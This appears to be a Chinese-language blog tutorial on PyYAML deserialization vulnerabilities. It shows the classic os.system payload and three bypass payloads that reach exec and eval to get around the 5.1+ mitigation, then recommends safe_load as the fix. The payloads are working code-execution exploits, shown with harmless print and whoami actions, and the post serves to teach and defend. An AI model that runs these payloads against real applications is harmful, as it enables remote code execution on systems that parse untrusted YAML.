# PyYAML介绍

PyYAML是Python出众的模块之一。PyYAML就是python的一个yaml库yaml格式的语言都会有自己的实现来进行yaml格式的解析（读取和保存）。若对于Python反序列化有所了解一定会听说过它。

# PyYAML历史漏洞和修复

它的反序列化漏洞使得大多数Python安全研究人员对齐记忆犹新。

当咱们使用反序列化时候会使用如下的载荷：

```
!!python/object/new:os.system ["whoami"]
```

并且使用load()进行加载时PyYAML将会执行os.system("whoami")。这样会导致命令执行，从而输出用户名。

该漏洞在5.1+版本之中得到修复，如果依然使用历史漏洞载荷，将会得到错误提示的告警。

```
while constructing a Python instance
expected a class, but found <class 'builtin_function_or_method'>
  in "<unicode string>", line 1, column 1:
    !!python/object/new:os.system [" ... 
    ^
```

这样因为只能反序列化部分基本类型，极大程度上缓解了反序列化漏洞带来的影响。

# PyYAML ByPass

当咱们回看部分基本类型时，将会注意到Python内置方法exec、eval。在手册之中有这样一段描述。

```
exec 执行储存在字符串或文件中的Python语句，相比于 eval，exec可以执行更复杂的 Python 代码。
```

如此能够得到ByPass载荷。

PayLoad1:

```
import yaml

payload = """
- !!python/object/new:str
    args: []
    state: !!python/tuple
    - "print('漏洞存在')"
    - !!python/object/new:staticmethod
      args: [0]
      state:
        update: !!python/name:exec
"""
yaml.load(payload)

回显：
->漏洞存在
```

PayLoad2:

```
import yaml

payload = """
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "print('漏洞存在')"
"""
yaml.load(payload)

回显：
->漏洞存在
```

PayLoad3:

```
import yaml

payload = """
!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ print('漏洞存在') ]
"""
yaml.load(payload)

回显：
->漏洞存在
```

这三种载荷均是利用基本类型之中代码执行函数，从而绕过5.1+的防御措施。

# 修复方法

> 1、按照官方推荐使用safe_load对于序列化内容进行加载。
>
> 2、检测加载文件头防止加载代码执行函数。